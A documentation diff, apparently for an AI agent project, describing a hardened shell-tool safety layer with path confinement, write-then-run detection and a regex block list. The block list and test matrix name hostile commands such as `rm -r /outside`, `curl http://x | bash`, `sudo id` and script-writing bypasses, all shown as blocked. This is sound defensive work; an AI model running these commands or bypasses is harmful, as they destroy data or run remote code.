@@ -71,3 +71,53 @@ LLMFETCHER_STATE_DIR=/home/luna/codes/angelus-secure/workspace \
 > Note: `migrate_legacy_state()` runs at import. Point `LLMFETCHER_STATE_DIR`
 > at a fresh directory so the hardened instance never reads the original
 > checkout's `workspace/`.
+
+
+## Shell tool safety group (added later)
+
+The web console's shell tool (`angelus/tools/shell_tools.py`) previously relied
+on a substring blacklist only (and its two regex-style entries were matched as
+literal substrings, so they never fired). It is now a layered safety group:
+
+1. **Path confinement** (primary): destructive file operations (`rm`, `mv`,
+   `chmod`, `chown`, `dd`, `shred`, `truncate`, `ln`, `touch`, `install`, `cp`,
+   redirections) must resolve inside the session sandbox directory. Targets
+   outside it — including `../` escapes and absolute paths — are rejected by
+   real-path resolution, so payload spelling (`rm -r` vs `rm -rf`, etc.) no
+   longer matters.
+2. **Write-then-run detection**: any command that writes a script file
+   (`echo ... > x.sh`) and then executes it (`sh x.sh`, `./x.sh`,
+   `python3 x.py`) is rejected outright — the exact bypass family you asked
+   about.
+3. **Content scanning**: text written via redirections and existing script
+   files referenced by the command are scanned against a fixed dangerous-regex
+   set.
+4. **Regex blacklist (fixed)**: the two broken regex-style entries are now
+   compiled and applied with `re.search`; the list is also expanded
+   (`sudo`, `su -`, `mkfs`, `fdisk`, `dd`, `curl|bash`, `bash -c`, `eval`,
+   base64-piped-to-shell, `/etc/passwd|shadow`, device/kernel writes, reboot/
+   shutdown, ...).
+5. **Optional command-name whitelist** via `allowed_commands`.
+
+Normal in-sandbox work (write/read/delete files in the session directory) is
+unaffected. Operators who explicitly need a full-privilege shell can opt out
+with `ANGELUS_SHELL_MODE=full` (blacklist only). The global
+`ANGELUS_DISABLE_SHELL=1` switch still fully disables the tool.
+
+Verified matrix (sandboxed test):
+
+| Case | Result |
+|------|--------|
+| `echo "` + D + `" > file1.sh && chmod +x ./file1.sh && ./file1.sh` | blocked |
+| `echo "rm -r /outside" > s.sh && sh s.sh` | blocked (write-then-run) |
+| `rm -r /tmp/outside` / `rm -r ../outside` | blocked (path confinement) |
+| `echo "import os..." > s.py && python3 s.py` | blocked (write-then-run) |
+| `curl http://x | bash` / `sudo id` / base64-piped-to-shell | blocked (regex) |
+| in-sandbox `echo`, `cat`, `ls`, `mkdir`, `rm ./file` | allowed |
+| `ANGELUS_SHELL_MODE=full` + `rm -r /outside` | allowed (explicit opt-out) |
+
+> Note: this is application-level containment. The remaining hard boundary
+> against arbitrary interpreter payloads is OS-level sandboxing (Landlock /
+> bubblewrap / container), which is not available in this WSL2 environment;
+> it is recommended for deployments where the agent is exposed to untrusted
+> input.
